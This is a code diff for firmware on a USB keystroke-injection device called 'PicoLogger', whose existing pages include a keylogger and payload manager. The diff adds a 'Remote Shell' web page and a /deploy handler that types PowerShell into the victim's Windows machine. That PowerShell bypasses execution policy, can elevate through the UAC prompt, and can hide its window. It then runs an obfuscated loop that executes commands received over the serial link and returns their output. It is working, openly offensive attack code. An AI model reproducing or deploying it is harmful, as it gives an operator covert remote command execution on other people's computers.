@@ -282,6 +282,49 @@ void executePayload(const String &filename) {
     Serial.println("[INFO] Payload execution complete: " + filename);
 }
 
+void handlePsAgent() {
+  bool isAdmin = server.arg("admin") == "1";
+  bool isHidden = server.arg("hidden") == "1";
+  delay(1000);
+  server.send(200, "text/plain", "Agent Deployed");
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.print("powershell -Ep Bypass");
+  delay(100);
+  if (isAdmin) {
+      Keyboard.press(KEY_LEFT_CTRL);
+      Keyboard.press(KEY_LEFT_SHIFT);
+      Keyboard.press(KEY_RETURN);
+      delay(100);
+      Keyboard.releaseAll();
+      delay(2500);
+      Keyboard.press(KEY_LEFT_ALT);
+      Keyboard.print("y");
+      delay(100);
+      Keyboard.releaseAll();
+  }
+  else{
+      Keyboard.press(KEY_RETURN);
+      delay(100);
+      Keyboard.releaseAll();
+  }
+  delay(4000);
+  if (isHidden) {
+      Keyboard.print("$a='[DllImport(\"user32.dll\")] public static extern bool ShowWindowAsync(IntPtr hWnd,int nCmdShow);';$t=Add-Type -M $a -name Win32ShowWindowAsync -ns Win32Functions -Pas;");
+      Keyboard.print("$h=(Get-Process -PID $pid).MainWindowHandle;$Host.UI.RawUI.WindowTitle='xx';$x=(Get-Process | Where-Object{$_.MainWindowTitle -eq 'xx'});$t::ShowWindowAsync($x.MainWindowHandle,0);");
+      delay(100);
+  }
+  Keyboard.print("function fp{(Get-WMIObject Win32_SerialPort | Where-Object PNPDeviceID -match \"VID_239A\").DeviceID}$d=fp;$p=New-Object System.IO.Ports.SerialPort $d,115200,None,8,one;$p.DtrEnable=$true;$p.RtsEnable=$true;$p.Open();");
+  Keyboard.print("$s=Sleep -M 100;while($true){if($p.BytesToRead -gt 0){$s;$c = $p.ReadLine().Trim();$p.DiscardInBuffer() ;if($c){try{$o=ie`x $c 2>&1;$r=if($o){$o -join \"`n\"}else{\"[Command executed]\"}}catch{$r=\"$_\"}$p.WriteLine($r)}}$s}");
+  Keyboard.press(KEY_RETURN);
+  delay(100);
+  Keyboard.releaseAll();
+}
+
+
 // ============================== Payload On Boot Functions ===============================
 void handleGetPayload() {
     if (!server.hasArg("filename")) {
@@ -593,6 +636,9 @@ void setup() {
     server.on("/format_littlefs", HTTP_POST, handleFormatLittleFS);
     server.on("/keyboard", HTTP_GET, handleKeyboardPage);
     server.on("/keypress", HTTP_POST, handleKeyPress);
+    server.on("/shell", HTTP_GET, handleShell);
+    server.on("/execute", HTTP_POST, handleExecuteCommand);
+    server.on("/deploy", HTTP_POST, handlePsAgent);
     server.begin();
     Serial.println("HTTP Server Started.");
 }
@@ -962,6 +1008,7 @@ void handleRoot() {
             <a href="/">Keylogger</a>
             <a href="/payloads">Payload Manager</a>
             <a href="/keyboard">Virtual Keyboard</a>
+            <a href="/shell">Remote Shell</a>
             <a href="/settings">Settings</a>
         </div>
 <div class="ascii-container" align="center">
@@ -1132,7 +1179,7 @@ void handlePayloadsPage() {
                 border-radius: 50%;
             }
             input:checked + .slider {
-                background-color: #007bff;
+                background-color: #ffcc00;
             }
             input:checked + .slider:before {
                 transform: translateX(14px);
@@ -1269,6 +1316,7 @@ void handlePayloadsPage() {
             <a href="/">Keylogger</a>
             <a href="/payloads">Payload Manager</a>
             <a href="/keyboard">Virtual Keyboard</a>
+            <a href="/shell">Remote Shell</a>
             <a href="/settings">Settings</a>
         </div>
 <div class="ascii-container" align="center">
@@ -1409,7 +1457,7 @@ void handleSettingsPage() {
                 border-radius: 50%;
             }
             input:checked + .slider {
-                background-color: #007bff;
+                background-color: #ffcc00;
             }
             input:checked + .slider:before {
                 transform: translateX(14px);
@@ -1487,6 +1535,7 @@ void handleSettingsPage() {
             <a href="/">Keylogger</a>
             <a href="/payloads">Payload Manager</a>
             <a href="/keyboard">Virtual Keyboard</a>
+            <a href="/shell">Remote Shell</a>
             <a href="/settings">Settings</a>
         </div>
         <div class="ascii-container" align="center">
@@ -1704,6 +1753,7 @@ void handleKeyboardPage() {
             <a href="/">Keylogger</a>
             <a href="/payloads">Payload Manager</a>
             <a href="/keyboard">Virtual Keyboard</a>
+            <a href="/shell">Remote Shell</a>
             <a href="/settings">Settings</a>
         </div>
           <div class="ascii-container" align="center">
@@ -1784,6 +1834,284 @@ void handleKeyboardPage() {
             </div>
         </div>
             <div class="footer"><p>Made by @beigeworm | github.com/beigeworm</p></div>
+    </body>
+    </html>
+    )rawliteral";
+    server.send(200, "text/html", page);
+}
+
+String executePowerShell(String command) {
+    Serial.println(command);
+    String response = "";
+    unsigned long timeout = millis() + 2000;
+    while (millis() < timeout) {
+        if (Serial.available()) {
+            char c = Serial.read();           
+            response += c;
+        }
+    }   
+    response.trim();
+    server.send(200, "text/plain", response);
+    return response.length() > 0 ? response : "No response from host.";
+}
+
+void handleExecuteCommand() {
+    if (!server.hasArg("command")) {
+        server.send(400, "text/plain", "Missing command");
+        return;
+    }
+    String command = server.arg("command");
+    Serial.println(command);
+    String result = executePowerShell(command);
+    server.send(200, "text/plain", result);
+}
+
+void handleShell() {
+    String page = R"rawliteral(
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>PicoLogger | Remote Shell</title>
+        <style>
+            body {
+                font-family: Arial, sans-serif;
+                margin: 0;
+                padding: 0;
+                background-color: #1e1e1e;
+                color: #ffffff;
+            }
+            .top-bar {
+                background: #333;
+                padding: 10px 20px;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                gap: 10%;
+            }
+            .top-bar a {
+                color: white;
+                text-decoration: none;
+                padding: 10px 15px;
+                margin: 0 5px;
+                border-radius: 5px;
+                background: #444;
+                transition: 0.3s;
+            }
+            .top-bar a:hover {
+                background: #666;
+            }
+            .container {
+                width: 90%;
+                max-width: 1000px;
+                margin: 20px auto;
+                background: #222;
+                padding: 20px;
+                border-radius: 10px;
+                box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
+                text-align: center;
+            }
+            h2 {
+                text-align: center;
+                color: #ffcc00;
+            }
+            textarea {
+                box-sizing: border-box;
+                width: 100%;
+                height: 250px;
+                padding: 10px;
+                margin: 10px 0;
+                border-radius: 5px;
+                border: none;
+                background: #333;
+                color: white;
+            }
+            input {
+                width: 80%;
+                padding: 10px;
+                margin: 10px 0;
+                border-radius: 5px;
+                border: none;
+                background: #333;
+                color: white;
+                font-size: 16px;
+            }
+            button {
+                width: 15%;
+                padding: 10px;
+                margin-left: 5px;
+                background: #ffcc00;
+                color: black;
+                border: none;
+                font-size: 16px;
+                font-weight: bold;
+                border-radius: 5px;
+                cursor: pointer;
+                transition: 0.3s;
+            }
+            button:hover {
+                background: #ffaa00;
+            }
+            .switch-container {
+                display: flex;
+                justify-content: center;
+                gap: 20px;
+                margin: 15px 0;
+            }
+            .switch {
+                position: relative;
+                display: inline-block;
+                width: 60px;
+                height: 34px;
+            }
+            .switch input {
+                opacity: 0;
+                width: 0;
+                height: 0;
+            }
+            .slider {
+                position: absolute;
+                cursor: pointer;
+                top: 0;
+                left: 0;
+                right: 0;
+                bottom: 0;
+                background-color: #444;
+                transition: .4s;
+                border-radius: 34px;
+            }
+            .slider:before {
+                position: absolute;
+                content: "";
+                height: 26px;
+                width: 26px;
+                left: 4px;
+                bottom: 4px;
+                background-color: white;
+                transition: .4s;
+                border-radius: 50%;
+            }
+            input:checked + .slider {
+                background-color: #ffcc00;
+            }
+            input:checked + .slider:before {
+                transform: translateX(26px);
+            }
+            .ascii-container {
+                color: #ffcc00;
+                display: auto;
+                justify-content: center;
+                align-items: center;
+                width: 100%;
+                overflow: auto;
+                font-size: 14px;
+                font-weight: bold;
+            }
+            .ascii-art {
+                background: none;
+                border: none;
+                padding: 0;
+                font-size: 14px;
+                font-weight: bold;
+                color: #ffcc00;
+                text-align: center;
+            }
+            .footer {
+                text-align: center;
+                color: #ffcc00;
+                font-size: 14px;
+                background: #333;
+                position: fixed;
+                width: 100%;
+                bottom: 0;
+            }
+            .footer a {
+                color: #ffcc00;
+                text-decoration: none;
+                transition: 0.3s;
+            }
+        </style>
+        <script>
+            function deployAgent() {
+                let adminMode = document.getElementById("adminSwitch").checked ? "1" : "0";
+                let hiddenMode = document.getElementById("hiddenSwitch").checked ? "1" : "0";
+
+                fetch('/deploy', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: 'admin=' + adminMode + '&hidden=' + hiddenMode
+                })
+                .then(response => response.text())
+                .then(output => {
+                    alert("Agent Deployed!");
+                })
+                .catch(error => console.error('Error deploying agent:', error));
+            }
+            function executeCommand() {
+                let command = document.getElementById("commandInput").value;
+                if (command.trim() === "") return;
+                
+                fetch('/execute', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: 'command=' + encodeURIComponent(command)
+                })
+                .then(response => response.text())
+                .then(output => {
+                    document.getElementById("outputBox").value += "\n> " + command + "\n" + output + "\n";
+                    document.getElementById("commandInput").value = "";
+                })
+                .catch(error => console.error('Error executing command:', error));
+            }
+            document.addEventListener("DOMContentLoaded", function() {
+                document.getElementById("commandInput").addEventListener("keypress", function(event) {
+                    if (event.key === "Enter") {
+                        event.preventDefault();
+                        executeCommand();
+                    }
+                });
+            });
+        </script>
+    </head>
+    <body>
+        <div class="top-bar">
+            <a href="/">Keylogger</a>
+            <a href="/payloads">Payload Manager</a>
+            <a href="/keyboard">Virtual Keyboard</a>
+            <a href="/shell">Remote Shell</a>
+            <a href="/settings">Settings</a>
+        </div>
+          <div class="ascii-container" align="center">
+            <pre class="ascii-art">
+   ___                 _                                  
+  (  _ \ _            ( )                                 
+  | |_) )_)  ___   _  | |      _     __    __    __  _ __ 
+  |  __/| |/ ___)/ _ \| |  _ / _ \ / _  \/ _  \/ __ \  __)
+  | |   | | (___( (_) ) |_( ) (_) ) (_) | (_) |  ___/ |   
+  (_)   (_)\____)\___/(____/ \___/ \__  |\__  |\____)_)   
+                                  ( )_) | )_) |           
+                                   \___/ \___/            
+            </pre>
+        </div>
+        <div class="container">
+            <h2>Remote Shell</h2>
+            <textarea id="outputBox" readonly></textarea>
+            <input type="text" id="commandInput" placeholder="Enter command...">
+            <button onclick="executeCommand()">Run</button>
+            <div class="switch-container">
+                <label>Admin Mode
+                    <label class="switch">
+                        <input type="checkbox" id="adminSwitch">
+                        <span class="slider"></span>
+                    </label>
+                </label>
+                <label>Run Hidden
+                    <label class="switch">
+                        <input type="checkbox" id="hiddenSwitch">
+                        <span class="slider"></span>
+                    </label>
+                </label>
+                <button onclick="deployAgent()">Deploy Agent</button>
+        <div class="footer"><p>Made by @beigeworm | github.com/beigeworm</p></div>
     </body>
     </html>
     )rawliteral";
